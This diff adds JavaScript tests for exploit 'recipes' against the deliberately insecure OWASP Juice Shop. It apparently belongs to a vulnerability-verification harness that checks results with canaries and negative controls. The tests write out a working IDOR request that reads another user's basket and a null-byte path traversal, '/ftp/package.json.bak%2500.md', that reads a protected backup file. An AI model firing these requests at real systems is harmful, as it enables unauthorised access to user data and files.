@@ -28,11 +28,17 @@ test("a recognized target name with an unrecognized config shape gets no recipes
   assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
 });
 
-test("juice-shop-v17.3.0 returns the two HTTP recipes and the DOM XSS recipe", () => {
+test("juice-shop-v17.3.0 returns the four HTTP recipes and the DOM XSS recipe", () => {
   const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
   assert.deepEqual(
     recipes.map((r) => r.id),
-    ["juice-shop-sqli-search", "juice-shop-login-bypass", "juice-shop-dom-xss-search"],
+    [
+      "juice-shop-sqli-search",
+      "juice-shop-login-bypass",
+      "juice-shop-idor-basket",
+      "juice-shop-ftp-poison-null-byte",
+      "juice-shop-dom-xss-search",
+    ],
   );
 });
 
@@ -238,6 +244,127 @@ test("login-bypass follow-up oracle: a non-JSON /api/Users response does not thr
   const canary = freshCanary();
 
   assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
+});
+
+function idorBasketRecipe() {
+  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
+    (r) => r.id === "juice-shop-idor-basket",
+  );
+  assert.ok(recipe);
+  return recipe;
+}
+
+test("idor-basket setup captures two principals, seeds a canary-tagged basket item for B, and pits A's own basket against B's", () => {
+  const recipe = idorBasketRecipe();
+  assert.equal(recipe.setup?.length, 5);
+
+  // Step 0: login as principal B (seeded by the fixture) and capture victimToken + victimBasketId.
+  const step0 = recipe.setup![0];
+  const loginRespB = {
+    status: 200,
+    body: JSON.stringify({ authentication: { token: "tok-b", bid: 6, umail: "b@bountydesk.test" } }),
+  };
+  assert.equal(step0.capture?.victimToken(loginRespB), "tok-b");
+  assert.equal(step0.capture?.victimBasketId(loginRespB), "6");
+  assert.equal(step0.capture?.victimBasketId({ status: 200, body: "not-json" }), undefined);
+
+  // Step 1: update Product 1's description to {{canary}} via PUT /api/Products/1.
+  assert.deepEqual(recipe.setup![1].request, {
+    method: "PUT",
+    path: "/api/Products/1",
+    body: { description: "{{canary}}" },
+  });
+
+  // Step 2: add Product 1 to B's basket.
+  assert.deepEqual(recipe.setup![2].request, {
+    method: "POST",
+    path: "/api/BasketItems",
+    headers: { Authorization: "Bearer {{victimToken}}" },
+    body: { ProductId: 1, BasketId: "{{victimBasketId}}", quantity: 1 },
+  });
+
+  // Step 4: login as principal A (registered in step 3) and capture attackerToken + attackerBasketId.
+  const step4 = recipe.setup![4];
+  const loginRespA = {
+    status: 200,
+    body: JSON.stringify({ authentication: { token: "tok-a", bid: 7, umail: "second-b@bountydesk.test" } }),
+  };
+  assert.equal(step4.capture?.attackerToken(loginRespA), "tok-a");
+  assert.equal(step4.capture?.attackerBasketId(loginRespA), "7");
+
+  assert.deepEqual(recipe.negativeControl, {
+    method: "GET",
+    path: "/rest/basket/{{attackerBasketId}}",
+    headers: { Authorization: "Bearer {{attackerToken}}" },
+  });
+  assert.deepEqual(recipe.exploit, {
+    method: "GET",
+    path: "/rest/basket/{{victimBasketId}}",
+    headers: { Authorization: "Bearer {{attackerToken}}" },
+  });
+});
+
+test("idor-basket oracle: canary in a returned basket product description is true; empty or other-field is false", async () => {
+  const recipe = idorBasketRecipe();
+  const canary = freshCanary();
+
+  const victimBasketBody = JSON.stringify({
+    status: "success",
+    data: {
+      id: 6,
+      Products: [{ id: 42, name: "bd-idor-item", description: canary }],
+    },
+  });
+  assert.equal(await recipe.oracleCheck({ status: 200, body: victimBasketBody }, canary), true);
+
+  const attackerBasketBody = JSON.stringify({
+    status: "success",
+    data: { id: 7, Products: [] },
+  });
+  assert.equal(await recipe.oracleCheck({ status: 200, body: attackerBasketBody }, canary), false);
+
+  // Coincidental canary outside Products[].description is ignored.
+  const coincidentalBody = JSON.stringify({
+    status: "success",
+    data: { id: 7, coupon: canary, Products: [{ id: 1, name: canary, description: "Apple Juice" }] },
+  });
+  assert.equal(await recipe.oracleCheck({ status: 200, body: coincidentalBody }, canary), false);
+  assert.equal(await recipe.oracleCheck({ status: 500, body: victimBasketBody }, canary), false);
+});
+
+function ftpPoisonNullByteRecipe() {
+  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
+    (r) => r.id === "juice-shop-ftp-poison-null-byte",
+  );
+  assert.ok(recipe);
+  return recipe;
+}
+
+test("ftp-poison-null-byte negative control and exploit paths", () => {
+  const recipe = ftpPoisonNullByteRecipe();
+  assert.deepEqual(recipe.negativeControl, {
+    method: "GET",
+    path: "/ftp/legal.md",
+  });
+  assert.deepEqual(recipe.exploit, {
+    method: "GET",
+    path: "/ftp/package.json.bak%2500.md",
+  });
+});
+
+test("ftp-poison-null-byte oracle: package.json.bak content is true; legal.md or error is false", async () => {
+  const recipe = ftpPoisonNullByteRecipe();
+  const canary = freshCanary();
+
+  const backupPkg = JSON.stringify({
+    name: "juice-shop",
+    version: "6.2.0-SNAPSHOT",
+    description: "An intentionally insecure JavaScript Web Application",
+  });
+  assert.equal(await recipe.oracleCheck({ status: 200, body: backupPkg }, canary), true);
+  assert.equal(await recipe.oracleCheck({ status: 200, body: "# Legal Information\n..." }, canary), false);
+  assert.equal(await recipe.oracleCheck({ status: 200, body: JSON.stringify({ name: "other" }) }, canary), false);
+  assert.equal(await recipe.oracleCheck({ status: 403, body: backupPkg }, canary), false);
 });
 
 // The four onboarding targets beyond juice-shop. These validate the recipe lookup and each
